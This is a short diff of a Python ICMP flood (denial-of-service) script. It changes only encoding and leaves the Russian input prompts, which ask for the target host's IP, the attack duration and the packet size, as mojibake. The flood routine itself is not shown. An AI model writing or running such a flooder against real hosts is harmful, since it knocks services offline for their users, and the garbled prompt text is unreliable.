@@ -1,5 +1,4 @@
-# -*- coding: cp1251 -*-
-from ctypes.wintypes import tagRECT
+п»їfrom ctypes.wintypes import tagRECT
 import socket
 import struct
 import sys
@@ -44,8 +43,8 @@ def calculate_checksum(data):
 
 if __name__ == '__main__':
     
-    target_ip = str(input('IP-адрес атакуемого хоста: '))
-    duration = int(input('Продолжительность атаки (с): '))
-    packet_size = int(input('Размер пакета (байт): '))
+    target_ip = str(input('IP-Р°РґСЂРµСЃ Р°С‚Р°РєСѓРµРјРѕРіРѕ С…РѕСЃС‚Р°: '))
+    duration = int(input('РџСЂРѕРґРѕР»Р¶РёС‚РµР»СЊРЅРѕСЃС‚СЊ Р°С‚Р°РєРё (СЃ): '))
+    packet_size = int(input('Р Р°Р·РјРµСЂ РїР°РєРµС‚Р° (Р±Р°Р№С‚): '))
     
     icmp_flood(target_ip, duration, packet_size)
